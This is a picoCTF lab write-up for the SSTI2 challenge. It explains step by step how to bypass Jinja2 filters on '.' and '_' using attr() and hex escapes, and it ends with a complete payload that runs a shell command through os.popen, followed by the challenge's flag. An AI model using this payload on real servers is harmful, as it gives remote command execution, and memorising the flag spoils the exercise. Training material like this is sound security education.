# picoCTF – SSTI2

## Challenge Information

* **CTF Name:** picoCTF
* **Challenge Name:** SSTI2
* **Category:** Web / Server-Side Template Injection (SSTI)
* **Difficulty:** Medium–Hard
* **Description:**
  A website allows users to submit input that is rendered using a template engine. Input sanitization is applied, but the goal is to bypass it and extract the flag.

---

## TL;DR (Summary)

The application is vulnerable to Jinja2 SSTI. By bypassing filters using `attr()` and encoded characters, Python internals are accessed to execute system commands and retrieve the flag.

---

## Thought Process & Approach

The challenge hints at templating and input sanitization. This strongly suggests testing for **Server-Side Template Injection (SSTI)**.

---

## Step 1 – Confirm SSTI

Test payload:

```
{{7*7}}
```

Observation:

```
49
```

This confirms that user input is being evaluated as a template.

---

## Step 2 – Identify Filtering

Testing different characters reveals:

* `_` is blocked
* `.` is blocked

This prevents normal attribute access like:

```
object.attribute
```

---

## Step 3 – Bypass `.` using attr()

Jinja2 provides the `attr()` filter, which can access attributes without using `.`.

Example:

```
request|attr('application')
```

---

## Step 4 – Bypass `_` using Encoding

The underscore character can be represented using hex encoding:

```
_ → \x5f
```

Example:

```
__globals__ → '\x5f\x5fglobals\x5f\x5f'
```

---

## Step 5 – Traverse to Python Internals

Starting from the `request` object:

```
request → application → __globals__
```

Payload fragment:

```
request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')
```

---

## Step 6 – Access Builtins

Use `__getitem__` to retrieve builtins:

```
|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
```

---

## Step 7 – Import Module

Access `__import__` to load the `os` module:

```
|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')
```

---

## Step 8 – Execute Command

Execute a system command:

```
|attr('popen')('cat flag')
```

---

## Step 9 – Read Output

Retrieve command output:

```
|attr('read')()
```

---

## Final Payload

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```

---

## Result

The payload executes successfully and reveals the flag.

---

## Final Answer

```
picoCTF{sst1_f1lt3r_byp4ss_afa6aa72}
```
